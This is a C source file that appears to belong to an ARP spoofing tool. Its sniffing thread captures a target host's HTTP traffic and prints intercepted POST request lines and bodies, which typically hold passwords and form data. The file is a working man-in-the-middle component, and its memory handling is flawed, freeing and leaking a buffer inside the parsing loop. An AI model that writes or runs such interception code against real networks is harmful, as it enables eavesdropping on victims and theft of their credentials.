#include "mainArpSpoofing.h"

pcap_t *fp;

int IpDiffCheck(u_char *targetIp, struct in_addr ip) {
	char ipbuff[32] = {0,};
	char ipbuff2[32] = {0,};
	
	if(inet_ntop(AF_INET, targetIp, ipbuff, sizeof(ipbuff)) == NULL) return -1;
	if(inet_ntop(AF_INET, &ip, ipbuff2, sizeof(ipbuff2)) == NULL) return -1;

	if(!strncmp(ipbuff, ipbuff2, sizeof(ipbuff))) return 1;
	else return -1;
}

void *TargetSniffing_ThreadRun(void *arguments) {
	_SPOOF *arg = (_SPOOF *)arguments;
	const u_char *pkt_data;
	struct pcap_pkthdr *header;
	struct libnet_ethernet_hdr *eth_hdr;
	struct libnet_ipv4_hdr *ipv4_hdr;
	struct libnet_tcp_hdr *tcp_hdr;
	char *ptr = NULL, *rptr = NULL, *post_ptr = NULL, *post_rptr = NULL, *tmpdata = NULL;
	char *tmp_ptr = NULL, *tmp_rptr = NULL;
	int res, result, tot_len, iphdr_len, tcphdr_len, http_len, con_len, data_off = 0;
	int http_flag = 0, i = 0;
	enum {
		GET = 1,
		POST,
		HTTP,
	};

	while((res = pcap_next_ex(fp, &header, &pkt_data)) >= 0) {
		http_flag = 0;
		if(res == 0) continue;
		if(header->len != header->caplen) {
			printf("Pcap File Error\n");
		}

		eth_hdr = (struct libnet_ethernet_hdr *)pkt_data;
		if(ntohs(eth_hdr->ether_type) == ETHERTYPE_IP) {
			pkt_data += sizeof(*eth_hdr);
			ipv4_hdr = (struct libnet_ipv4_hdr *)pkt_data;
			if(ipv4_hdr->ip_p == IPV4PRO_TCP) {
				tot_len = ntohs(ipv4_hdr->ip_len);
				iphdr_len = ipv4_hdr->ip_hl * 4;
				if((result = IpDiffCheck(arg->getTargetIp, ipv4_hdr->ip_src)) > 0 || (result = IpDiffCheck(arg->getTargetIp, ipv4_hdr->ip_dst)) > 0) {
					pkt_data += sizeof(*ipv4_hdr);
					tcp_hdr = (struct libnet_tcp_hdr *)pkt_data;
					tcphdr_len = tcp_hdr->th_off * 4;
					if(ntohs(tcp_hdr->th_sport) == HTTP_PORT || ntohs(tcp_hdr->th_dport) == HTTP_PORT) {
						pkt_data += tcphdr_len;
						http_len = tot_len - tcphdr_len - iphdr_len;
						tmpdata = strndup((char *)pkt_data, http_len);
						for(ptr = strtok_r((char *)pkt_data, "\r\n", &rptr), i = 0; ptr; ptr = strtok_r(NULL, "\r\n", &rptr), i++) {
							data_off = 0;
							if(!strncmp(ptr, "GET", 3) && i == 0) {
								//printf("%s\n", ptr);
								http_flag = GET;
							} else if(!strncmp(ptr, "POST", 4) && i == 0) {
								printf("%s\n", ptr);
								http_flag = POST;
							} else if(!strncmp(ptr, "HTTP", 4) && i == 0) {
								//printf("%s\n", ptr);
								http_flag = HTTP;
							}
							if(http_flag == GET) {
								break;	
							} else if(http_flag == POST) {
								if(!strncmp(ptr, "Content-Length:", 15)) {
									printf("%s\n", ptr);
									post_ptr = strtok_r(strcasestr(ptr, "Content-Length: "), " ", &post_rptr);
									post_ptr = strtok_r(NULL, " ", &post_rptr);
									con_len = atoi(post_ptr);
									data_off = http_len - con_len;
								}
								if(data_off > 0) {
									tmpdata += data_off;
									//for(tmp_ptr = strtok_r(tmpdata, "\n", &tmp_rptr); tmp_ptr; tmp_ptr = strtok_r(NULL, "\n", &tmp_rptr)) printf("%s\n", tmp_ptr);
									printf("%s\n", tmpdata);
									tmpdata -= data_off;
									memset(tmpdata, 0x00, http_len);
									free(tmpdata);
								}
							} else if(http_flag == HTTP) {
								break;
							}
						}
					}
				}
			}
		}
	}

	pthread_exit(NULL);
}

void SetArpSniffPcapHandle(pcap_t *return_fp) {
	fp = return_fp;
}
